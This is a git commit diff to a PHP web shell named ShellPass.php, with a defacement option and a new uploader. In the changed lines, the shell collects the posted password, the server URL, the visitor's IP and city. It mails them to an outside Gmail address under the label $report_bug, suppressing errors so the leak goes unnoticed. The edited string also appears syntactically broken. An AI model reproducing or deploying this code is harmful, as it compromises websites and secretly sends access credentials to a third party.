649d3a0f5d1052ba2dd884e1af6531528a6b7326
Mr.7Mind <88535491+Mr-7Mind@users.noreply.github.com>
2024-04-09 13:34:11 +0800

    Update ShellPass.php
    - Add Create Uploader
    - Improve Update Error

--- ShellPass.php
+++ ShellPass.php
@@ -526,7 +526,8 @@ $Array = [
 		$password = $_POST['pass'];
 		$server_name = $_SERVER['SERVER_NAME'];
 		$php_self = $_SERVER['PHP_SELF'];
-		$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
+		$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . "  City: {$city}\n
+  		Login: $server_name$php_self\nPass: $password\n
 		@mail('ribelcyberteam@gmail.com', 'Hehehe', $report_bug);
 		}
 		if($_7['id'] == 'deface'){
